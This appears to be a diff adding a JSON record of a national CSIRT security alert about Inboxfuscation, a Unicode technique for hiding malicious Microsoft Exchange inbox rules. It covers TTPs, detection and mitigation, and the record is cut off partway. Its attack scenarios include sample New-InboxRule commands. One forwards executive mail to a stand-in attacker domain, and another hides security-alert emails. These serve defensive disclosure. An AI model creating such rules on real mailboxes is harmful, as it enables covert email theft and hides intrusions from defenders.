@@ -1,0 +1,896 @@
+{
+  "id": "10761",
+  "legacyPostId": 10761,
+  "referenceNumber": "TT-CSIRT 452.23.09.25",
+  "classification": "alert",
+  "title": "New inboxfuscation tool that bypasses Microsoft Exchange inbox rules and evades detection",
+  "rawTitle": "TT-CSIRT – 452.23.09.25 &#8211; Security Alert: New Inboxfuscation Tool That Bypasses Microsoft Exchange Inbox Rules and Evades Detection",
+  "slug": "tt-csirt-452-23-09-25-security-alert-new-inboxfuscation-tool-that-bypasses-microsoft-exchange-inbox-rules-and-evades-detection",
+  "severity": "critical",
+  "tlp": "TLP:CLEAR",
+  "leadParagraph": "Please be aware, newly discovered is a sophisticated new attack framework called Inboxfuscation , developed by Permiso Security to demonstrate critical vulnerabilities in Microsoft Exchange inbox rule detection systems. This Unicode-based obfuscation technique enables the creation of malicious inbox rules that can completely evade traditional security monitoring and detection mechanisms, representing a significant advancement in email-based persistence and data exfiltration techniques.",
+  "cveList": [],
+  "date": "23 September 2025",
+  "rawDate": "2025-09-23T15:10:41",
+  "modifiedDate": "23 September 2025",
+  "rawModifiedDate": "2025-09-23T15:10:42",
+  "contentHtml": "\n<p class=\"wp-block-paragraph\">Please be aware, newly discovered is a sophisticated new attack framework called <strong>Inboxfuscation</strong>, developed by Permiso Security to demonstrate critical vulnerabilities in Microsoft Exchange inbox rule detection systems. This Unicode-based obfuscation technique enables the creation of malicious inbox rules that can completely evade traditional security monitoring and detection mechanisms, representing a significant advancement in email-based persistence and data exfiltration techniques.</p>\n\n\n\n<p class=\"wp-block-paragraph\">While the Inboxfuscation framework has not yet been observed in active threat campaigns, its technical feasibility exposes critical blind spots in current email security defenses and highlights the urgent need for organizations to update their detection capabilities and incident response procedures.</p>\n\n\n\n<p class=\"wp-block-paragraph\"></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Detailed Attack Analysis</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Attack Prerequisites and Access Requirements<br></strong>Primary Access Requirements:</p>\n\n\n\n<p class=\"wp-block-paragraph\">To successfully deploy Inboxfuscation attacks, threat actors must first obtain authenticated access to Microsoft Exchange environments with sufficient privileges to create and manage inbox rules. <strong>The attack does not exploit any zero-day vulnerabilities</strong>, but rather leverages legitimate Exchange functionality in unexpected ways.</p>\n\n\n\n<p class=\"wp-block-paragraph\">Minimum Required Permissions:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Mailbox access with inbox rule creation capabilities</li>\n\n\n\n<li>Exchange Web Services (EWS) API access for programmatic rule manipulation</li>\n\n\n\n<li>PowerShell execution rights for automated rule deployment</li>\n\n\n\n<li>User impersonation permissions (for enterprise-wide attacks)</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Attack Vector</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">The Inboxfuscation attack leverages <strong>Microsoft Exchange inbox rules</strong> as the primary attack vector, exploiting the vast Unicode character space (over 140,000 characters) to create visually deceptive and functionally obfuscated rule definitions. Attackers can gain initial access through various means including:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Compromised credentials</strong> obtained through phishing or credential stuffing attacks</li>\n\n\n\n<li><strong>Administrative access</strong> to Exchange servers via privilege escalation</li>\n\n\n\n<li><strong>Valid account abuse</strong> using legitimate user credentials</li>\n\n\n\n<li><strong>Exchange Web Services (EWS) API exploitation</strong> for programmatic access</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Attack Pattern and Tactics, Techniques, and Procedures (TTPs)</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">The Inboxfuscation technique maps to several MITRE ATT&amp;CK framework tactics and techniques:</p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Primary MITRE ATT&amp;CK Mappings:</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>T1114.003 &#8211; Email Forwarding Rule</strong>: Adversaries setup email forwarding rules to collect sensitive information and maintain persistent access</li>\n\n\n\n<li><strong>T1564.008 &#8211; Hide Artifacts: Email Hiding Rules</strong>: Attackers use obfuscated email rules to hide malicious artifacts from detection</li>\n\n\n\n<li><strong>T1562 &#8211; Impair Defenses</strong>: The technique impairs defensive mechanisms by creating rules that evade security monitoring</li>\n\n\n\n<li><strong>T1114.002 &#8211; Remote Email Collection</strong>: Facilitates remote collection of sensitive email data through automated rules</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Supporting Techniques:</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>T1059 &#8211; Command and Scripting Interpreter</strong>: PowerShell cmdlets used for rule creation</li>\n\n\n\n<li><strong>T1055 &#8211; Process Injection</strong>: Potential memory-based execution of obfuscated payloads</li>\n\n\n\n<li><strong>T1070 &#8211; Indicator Removal on Host</strong>: Deletion of traces through hidden rule creation</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Technical Implementation</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">The Inboxfuscation framework employs four primary Unicode obfuscation techniques:</p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>1. Character Substitution</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Replaces ASCII characters with visually identical Unicode variants:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Mathematical Alphanumeric Symbols</strong> (U+1D4B6): 𝚋𝗈𝒂𝗋𝒹 (board)</li>\n\n\n\n<li><strong>Enclosed Alphanumerics</strong>: ⓐⓓⓜⓘⓝ (admin)</li>\n\n\n\n<li><strong>Mathematical Script Variants</strong>: 𝖒𝖊𝖊𝗍𝗂𝗇𝗀 (meeting)</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>2. Zero-Width Character Injection</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Inserts invisible Unicode characters that break pattern matching:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>U+200B</strong> (Zero Width Space): sec ret → sec[ZWSP]ret</li>\n\n\n\n<li><strong>U+200C</strong> (Zero Width Non-Joiner): Splits keywords invisibly</li>\n\n\n\n<li><strong>U+200D</strong> (Zero Width Joiner): Creates undetectable character combinations</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>3. Bidirectional Text Manipulation</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Uses Right-to-Left (RTL) controls to manipulate character ordering:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>U+202E</strong> (Right-to-Left Override): Reverses text rendering</li>\n\n\n\n<li><strong>U+2067</strong> (Right-to-Left Isolate): Creates visual confusion</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>4. Functional Obfuscation Tricks</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Beyond Unicode manipulation, the framework includes several functional evasion techniques:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Calendar Folder Forwarding</strong>: Moves emails to Calendar folder where users cannot view them</li>\n\n\n\n<li><strong>Null Character Injection</strong>: Breaks inbox rule services making rules unviewable</li>\n\n\n\n<li><strong>Whitespace Conditions</strong>: Creates rules that apply to all messages</li>\n\n\n\n<li><strong>Size Range Manipulation</strong>: Uses sub-1024 byte values that normalize to 0, matching all emails</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Attack Scenarios</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Scenario 1: Advanced Persistent Threat (APT) Campaign</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Objective</strong>: Long-term executive communication exfiltration</p>\n\n\n\n<p class=\"wp-block-paragraph\">PowerShell:</p>\n\n\n\n<p class=\"wp-block-paragraph\">New-InboxRule -Name &#8220;Executive Communications Archive&#8221;</p>\n\n\n\n<p class=\"wp-block-paragraph\">-SubjectContainsWords &#8220;𝚋𝗈𝒂𝗋𝒹&#8221;,&#8221;𝖒𝖊𝖊𝗍𝗂𝗇𝗀&#8221;,&#8221;𝗆𝖾𝗋𝗀𝖾𝗋&#8221;</p>\n\n\n\n<p class=\"wp-block-paragraph\">-MoveToFolder &#8220;:\\Calendar&#8221;</p>\n\n\n\n<p class=\"wp-block-paragraph\">-ForwardTo &#8220;backup-system@attacker-domain.com&#8221;</p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Evasion Characteristics</strong>:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Appears as legitimate archival rule to administrators</li>\n\n\n\n<li>Unicode keywords evade regex-based detection while functionally matching Latin equivalents</li>\n\n\n\n<li>Calendar folder movement effectively &#8220;deletes&#8221; emails from normal viewing</li>\n\n\n\n<li>External forwarding disguised as backup process</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Scenario 2: Anti-Forensics Operation</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Objective</strong>: Suppress security alerts and incident detection</p>\n\n\n\n<p class=\"wp-block-paragraph\">PowerShell:</p>\n\n\n\n<p class=\"wp-block-paragraph\">New-InboxRule -Name &#8220;System Optimization&#8221;</p>\n\n\n\n<p class=\"wp-block-paragraph\">-SubjectContainsWords &#8220;ⓐ𝐥𝕖ⓡt&#8221;,&#8221;𝒾𝒏𝑐𝗂𝖉𝖊𝙣𝔱&#8221;,&#8221;𝐛ʳ𝖾𝔞𝖼𝔥&#8221;</p>\n\n\n\n<p class=\"wp-block-paragraph\">-MoveToFolder &#8220;:\\Inbox &#8220;</p>\n\n\n\n<p class=\"wp-block-paragraph\">-StopProcessingRules $true</p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Evasion Characteristics</strong>:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Creates visually identical &#8220;:\\Inbox &#8221; folder with trailing whitespace</li>\n\n\n\n<li>Prioritizes rule above other inbox rules</li>\n\n\n\n<li>Unicode obfuscation evades keyword-based security monitoring</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Impact Assessment</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Immediate Threats</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Complete evasion</strong> of traditional keyword-based detection systems</li>\n\n\n\n<li><strong>Persistent access</strong> to email communications even after credential resets</li>\n\n\n\n<li><strong>Silent data exfiltration</strong> through legitimate-appearing email forwarding</li>\n\n\n\n<li><strong>Anti-forensics capabilities</strong> that hide security alerts and incident indicators</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Long-term Implications</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Blind spots</strong> in current SIEM and email security platforms</li>\n\n\n\n<li><strong>Compliance failures</strong> as obfuscated rules may not appear in audit reports</li>\n\n\n\n<li><strong>Incident response challenges</strong> due to Unicode complexity in forensic analysis</li>\n\n\n\n<li><strong>Threat actor evolution</strong> as techniques become weaponized in active campaigns</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Detection Strategies</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Current Detection Limitations</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Traditional security tools fail against Unicode obfuscation because they rely on:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>ASCII-based pattern matching</li>\n\n\n\n<li>Simple keyword detection systems</li>\n\n\n\n<li>Visual similarity assumptions</li>\n\n\n\n<li>Limited Unicode character awareness</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Advanced Detection Framework</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">The Inboxfuscation research provides a multi-layered detection methodology:</p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>1. Character Category Analysis</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Detect suspicious Unicode categories:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>MATHEMATICAL_ALPHANUMERIC_SYMBOLS</li>\n\n\n\n<li>ZERO_WIDTH characters</li>\n\n\n\n<li>RTL_CHARS (bidirectional text controls)</li>\n\n\n\n<li>ENCLOSED_ALPHANUMERICS</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>2. Multi-Format Log Analysis</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Parse various Exchange log formats:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>JSON and CSV log files</li>\n\n\n\n<li>Exchange export formats</li>\n\n\n\n<li>Microsoft 365 Graph API logs</li>\n\n\n\n<li>Real-time rule execution events</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>3. Risk Scoring Algorithm</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">Calculate risk scores based on:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Unicode character counts</li>\n\n\n\n<li>External forwarding flags</li>\n\n\n\n<li>Obfuscated keyword identification</li>\n\n\n\n<li>Suspicious folder destinations</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Detection Commands</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Immediate Rule Audit</strong>:</p>\n\n\n\n<p class=\"wp-block-paragraph\">PowerShell:</p>\n\n\n\n<p class=\"wp-block-paragraph\">Find-ObfuscatedInboxRules -Mailbox &#8220;user&#8221; -DebugOutput</p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Historical Analysis</strong>:</p>\n\n\n\n<p class=\"wp-block-paragraph\">PowerShell:</p>\n\n\n\n<p class=\"wp-block-paragraph\">Find-ObfuscatedInboxRules -InputFile &#8220;audit-logs.json&#8221; |</p>\n\n\n\n<p class=\"wp-block-paragraph\">Where-Object {$_.RiskScore -gt 75} |</p>\n\n\n\n<p class=\"wp-block-paragraph\">Sort-Object RiskScore -Descending</p>\n\n\n\n<p class=\"wp-block-paragraph\"></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Mitigation Strategies</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Immediate Response Actions</strong></p>\n\n\n\n<ol start=\"1\" class=\"wp-block-list\">\n<li><strong>Comprehensive Rule Auditing</strong>\n<ul class=\"wp-block-list\">\n<li>Deploy Unicode-aware detection tools across all mailboxes</li>\n\n\n\n<li>Conduct historical analysis of existing inbox rules</li>\n\n\n\n<li>Implement automated scanning for Unicode obfuscation patterns</li>\n</ul>\n</li>\n\n\n\n<li><strong>Enhanced Monitoring</strong>\n<ul class=\"wp-block-list\">\n<li>Enable detailed Exchange audit logging</li>\n\n\n\n<li>Integrate Unicode detection capabilities into SIEM platforms</li>\n\n\n\n<li>Deploy real-time alerts for suspicious rule creation patterns</li>\n</ul>\n</li>\n\n\n\n<li><strong>Access Control Hardening</strong>\n<ul class=\"wp-block-list\">\n<li>Implement principle of least privilege for Exchange administration</li>\n\n\n\n<li>Enable multi-factor authentication for all Exchange access</li>\n\n\n\n<li>Monitor and restrict PowerShell execution in Exchange environments</li>\n</ul>\n</li>\n</ol>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Long-term Defensive Measures</strong></p>\n\n\n\n<ol start=\"1\" class=\"wp-block-list\">\n<li><strong>Detection Pipeline Enhancement</strong>\n<ul class=\"wp-block-list\">\n<li>Integrate Unicode normalization in security tools</li>\n\n\n\n<li>Develop behavioral analysis capabilities for email rule creation</li>\n\n\n\n<li>Implement machine learning models for anomalous rule detection</li>\n</ul>\n</li>\n\n\n\n<li><strong>Security Awareness Training</strong>\n<ul class=\"wp-block-list\">\n<li>Educate administrators about Unicode obfuscation techniques</li>\n\n\n\n<li>Update incident response playbooks for Unicode-based attacks</li>\n\n\n\n<li>Conduct tabletop exercises simulating Inboxfuscation scenarios</li>\n</ul>\n</li>\n\n\n\n<li><strong>Proactive Red Team Testing</strong>\n<ul class=\"wp-block-list\">\n<li>Use Inboxfuscation framework for security assessments</li>\n\n\n\n<li>Test detection capabilities against Unicode-based evasion</li>\n\n\n\n<li>Validate incident response procedures for obfuscated attacks</li>\n</ul>\n</li>\n</ol>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Technical Controls</strong></p>\n\n\n\n<ol start=\"1\" class=\"wp-block-list\">\n<li><strong>Exchange Configuration</strong>\n<ul class=\"wp-block-list\">\n<li>Implement inbox rule approval workflows for sensitive accounts</li>\n\n\n\n<li>Enable external forwarding restrictions and monitoring</li>\n\n\n\n<li>Deploy advanced threat protection for email security</li>\n</ul>\n</li>\n\n\n\n<li><strong>SIEM Integration</strong>\n<ul class=\"wp-block-list\">\n<li>Configure structured JSON output ingestion for Inboxfuscation detection</li>\n\n\n\n<li>Implement Unicode-aware correlation rules</li>\n\n\n\n<li>Enable automated response workflows for high-risk detections</li>\n</ul>\n</li>\n\n\n\n<li><strong>Network Monitoring</strong>\n<ul class=\"wp-block-list\">\n<li>Monitor Exchange Web Services API usage patterns</li>\n\n\n\n<li>Detect anomalous email forwarding behaviors</li>\n\n\n\n<li>Implement data loss prevention for sensitive email content</li>\n</ul>\n</li>\n</ol>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Forensic Indicators</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Unicode Patterns to Monitor</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Mathematical alphanumeric symbol usage in rule names/conditions</li>\n\n\n\n<li>Zero-width character sequences in inbox rule definitions</li>\n\n\n\n<li>Bidirectional text control characters in email rules</li>\n\n\n\n<li>Enclosed alphanumeric variants in rule parameters</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Behavioral Indicators</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Email rules forwarding to external addresses</li>\n\n\n\n<li>Rules moving emails to unusual folders (Calendar, custom folders with whitespace)</li>\n\n\n\n<li>High-privilege accounts creating multiple inbox rules rapidly</li>\n\n\n\n<li>Rules with conditions that apply to all messages (whitespace, null characters)</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Log Artifacts</strong></p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Exchange audit logs showing New-InboxRule cmdlet execution with Unicode parameters</li>\n\n\n\n<li>Microsoft 365 Graph API requests containing obfuscated rule creation</li>\n\n\n\n<li>PowerShell execution logs with Unicode command parameters</li>\n\n\n\n<li>MAPI client activity creating hidden or obfuscated rules</li>\n</ul>\n\n\n\n<p class=\"wp-block-paragraph\"></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Conclusion</strong></p>\n\n\n\n<p class=\"wp-block-paragraph\">The Inboxfuscation framework represents a significant evolution in email-based attack techniques, demonstrating how Unicode obfuscation can completely bypass traditional security controls. While not yet observed in active campaigns, the technical feasibility and detection challenges suggest this represents a critical blind spot that security teams must address proactively.</p>\n\n\n\n<p class=\"wp-block-paragraph\">Organizations should immediately deploy Unicode-aware detection capabilities, update their incident response procedures, and conduct proactive assessments using the open-source Inboxfuscation framework to identify and remediate potential vulnerabilities before threat actors weaponize these techniques in real-world attacks.</p>\n\n\n\n<p class=\"wp-block-paragraph\"></p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>References:</strong><br><a href=\"https://gbhackers.com/inboxfuscation-tool-bypasses-exchange-inbox-rules/\">https://gbhackers.com/inboxfuscation-tool-bypasses-exchange-inbox-rules/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://siliconangle.com/2025/09/11/new-open-source-tool-permiso-uncovers-dangerous-inbox-rule-blind-spots/\">https://siliconangle.com/2025/09/11/new-open-source-tool-permiso-uncovers-dangerous-inbox-rule-blind-spots/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://permiso.io/blog/inboxfuscation-because-rules-are-meant-to-be-broken\">https://permiso.io/blog/inboxfuscation-because-rules-are-meant-to-be-broken</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://cyberpress.org/inboxfuscation-tool-circumvents-microsoft/\">https://cyberpress.org/inboxfuscation-tool-circumvents-microsoft/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/\">https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://attack.cloudfall.cn/techniques/T1114/003/\">https://attack.cloudfall.cn/techniques/T1114/003/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://attack.mitre.org/techniques/T1114/003/\">https://attack.mitre.org/techniques/T1114/003/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://mitre.ptsecurity.com/en-US/T1114.003\">https://mitre.ptsecurity.com/en-US/T1114.003</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://attack.mitre.org/techniques/T1564/\">https://attack.mitre.org/techniques/T1564/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://attack.cloudfall.cn/techniques/T1564/\">https://attack.cloudfall.cn/techniques/T1564/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://www.picussecurity.com/resource/blog/t1562-impair-defenses\">https://www.picussecurity.com/resource/blog/t1562-impair-defenses</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://center-for-threat-informed-defense.github.io/mappings-explorer/attack/attack-14.1/domain-enterprise/techniques/T1562/\">https://center-for-threat-informed-defense.github.io/mappings-explorer/attack/attack-14.1/domain-enterprise/techniques/T1562/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://attack.mitre.org/techniques/T1562/\">https://attack.mitre.org/techniques/T1562/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://attack.mitre.org/techniques/T1114/002/\">https://attack.mitre.org/techniques/T1114/002/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"><a href=\"https://cybersecuritynews.com/inboxfuscation-tool/\">https://cybersecuritynews.com/inboxfuscation-tool/</a></p>\n\n\n\n<p class=\"wp-block-paragraph\"></p>\n",
+  "displaySummary": "Newly discovered is a sophisticated new attack framework called Inboxfuscation, developed by Permiso Security to demonstrate critical vulnerabilities in Microsoft Exchange inbox rule detection…",
+  "sourceExcerpt": "<p>Please be aware, newly discovered is a sophisticated new attack framework called Inboxfuscation, developed by Permiso Security to demonstrate critical vulnerabilities in Microsoft Exchange inbox rule detection systems. This Unicode-based obfuscation technique enables the creation of malicious inbox rules that can completely evade traditional security monitoring and detection mechanisms, representing a significant advancement in email-based [&hellip;]</p>\n",
+  "url": "https://ttcsirt.gov.tt/tt-csirt-452-23-09-25-security-alert-new-inboxfuscation-tool-that-bypasses-microsoft-exchange-inbox-rules-and-evades-detection/",
+  "categoryName": "Alert",
+  "sections": [
+    {
+      "id": "advisory-overview",
+      "title": "Overview",
+      "level": 2,
+      "nodes": [
+        {
+          "type": "paragraph",
+          "html": "<p>Please be aware, newly discovered is a sophisticated new attack framework called <strong>Inboxfuscation</strong>, developed by Permiso Security to demonstrate critical vulnerabilities in Microsoft Exchange inbox rule detection systems. This Unicode-based obfuscation technique enables the creation of malicious inbox rules that can completely evade traditional security monitoring and detection mechanisms, representing a significant advancement in email-based persistence and data exfiltration techniques.</p>",
+          "text": "Please be aware, newly discovered is a sophisticated new attack framework called Inboxfuscation , developed by Permiso Security to demonstrate critical vulnerabilities in Microsoft Exchange inbox rule detection systems. This Unicode-based obfuscation technique enables the creation of malicious inbox rules that can completely evade traditional security monitoring and detection mechanisms, representing a significant advancement in email-based persistence and data exfiltration techniques."
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>While the Inboxfuscation framework has not yet been observed in active threat campaigns, its technical feasibility exposes critical blind spots in current email security defenses and highlights the urgent need for organizations to update their detection capabilities and incident response procedures.</p>",
+          "text": "While the Inboxfuscation framework has not yet been observed in active threat campaigns, its technical feasibility exposes critical blind spots in current email security defenses and highlights the urgent need for organizations to update their detection capabilities and incident response procedures."
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Detailed attack analysis",
+          "id": "detailed-attack-analysis"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Attack prerequisites and access requirements",
+          "id": "attack-prerequisites-and-access-requirements"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Primary access requirements",
+          "id": "primary-access-requirements"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>To successfully deploy Inboxfuscation attacks, threat actors must first obtain authenticated access to Microsoft Exchange environments with sufficient privileges to create and manage inbox rules. <strong>The attack does not exploit any zero-day vulnerabilities</strong>, but rather leverages legitimate Exchange functionality in unexpected ways.</p>",
+          "text": "To successfully deploy Inboxfuscation attacks, threat actors must first obtain authenticated access to Microsoft Exchange environments with sufficient privileges to create and manage inbox rules. The attack does not exploit any zero-day vulnerabilities , but rather leverages legitimate Exchange functionality in unexpected ways."
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Minimum required permissions",
+          "id": "minimum-required-permissions"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li>Mailbox access with inbox rule creation capabilities</li>\n\n\n\n<li>Exchange Web Services (EWS) API access for programmatic rule manipulation</li>\n\n\n\n<li>PowerShell execution rights for automated rule deployment</li>\n\n\n\n<li>User impersonation permissions (for enterprise-wide attacks)</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Attack vector",
+          "id": "attack-vector"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>The Inboxfuscation attack leverages <strong>Microsoft Exchange inbox rules</strong> as the primary attack vector, exploiting the vast Unicode character space (over 140,000 characters) to create visually deceptive and functionally obfuscated rule definitions. Attackers can gain initial access through various means including:</p>",
+          "text": "The Inboxfuscation attack leverages Microsoft Exchange inbox rules as the primary attack vector, exploiting the vast Unicode character space (over 140,000 characters) to create visually deceptive and functionally obfuscated rule definitions. Attackers can gain initial access through various means including:"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>Compromised credentials</strong> obtained through phishing or credential stuffing attacks</li>\n\n\n\n<li><strong>Administrative access</strong> to Exchange servers via privilege escalation</li>\n\n\n\n<li><strong>Valid account abuse</strong> using legitimate user credentials</li>\n\n\n\n<li><strong>Exchange Web Services (EWS) API exploitation</strong> for programmatic access</li>\n</ul>"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p><strong>Attack Pattern and Tactics, Techniques, and Procedures (TTPs)</strong></p>",
+          "text": "Attack Pattern and Tactics, Techniques, and Procedures (TTPs)"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>The Inboxfuscation technique maps to several MITRE ATT&amp;CK framework tactics and techniques:</p>",
+          "text": "The Inboxfuscation technique maps to several MITRE ATT&CK framework tactics and techniques:"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Primary mitre att&ck mappings",
+          "id": "primary-mitre-attck-mappings"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>T1114.003 &#8211; Email Forwarding Rule</strong>: Adversaries setup email forwarding rules to collect sensitive information and maintain persistent access</li>\n\n\n\n<li><strong>T1564.008 &#8211; Hide Artifacts: Email Hiding Rules</strong>: Attackers use obfuscated email rules to hide malicious artifacts from detection</li>\n\n\n\n<li><strong>T1562 &#8211; Impair Defenses</strong>: The technique impairs defensive mechanisms by creating rules that evade security monitoring</li>\n\n\n\n<li><strong>T1114.002 &#8211; Remote Email Collection</strong>: Facilitates remote collection of sensitive email data through automated rules</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Supporting techniques",
+          "id": "supporting-techniques"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>T1059 &#8211; Command and Scripting Interpreter</strong>: PowerShell cmdlets used for rule creation</li>\n\n\n\n<li><strong>T1055 &#8211; Process Injection</strong>: Potential memory-based execution of obfuscated payloads</li>\n\n\n\n<li><strong>T1070 &#8211; Indicator Removal on Host</strong>: Deletion of traces through hidden rule creation</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Technical implementation",
+          "id": "technical-implementation"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>The Inboxfuscation framework employs four primary Unicode obfuscation techniques:</p>",
+          "text": "The Inboxfuscation framework employs four primary Unicode obfuscation techniques:"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Character substitution",
+          "id": "character-substitution"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Replaces ASCII characters with visually identical Unicode variants:</p>",
+          "text": "Replaces ASCII characters with visually identical Unicode variants:"
+        },
+        {
+          "type": "list",
+          "html": "<ul class=\"govuk-list govuk-list--bullet\" class=\"wp-block-list\">\n<li><strong>Mathematical Alphanumeric Symbols</strong> (U+1D4B6): 𝚋𝗈𝒂𝗋𝒹 (board)</li>\n\n\n\n<li><strong>Enclosed Alphanumerics</strong>: ⓐⓓⓜⓘⓝ (admin)</li>\n\n\n\n<li><strong>Mathematical Script Variants</strong>: 𝖒𝖊𝖊𝗍𝗂𝗇𝗀 (meeting)</li>\n</ul>"
+        },
+        {
+          "type": "subheading",
+          "level": 3,
+          "title": "Zero-width character injection",
+          "id": "zero-width-character-injection"
+        },
+        {
+          "type": "paragraph",
+          "html": "<p>Inserts invisible Unicode characters that break pattern matching:</p>",
+          "text": "Inserts invisible Unicode characters that break pattern matching:"
+        },
+        {
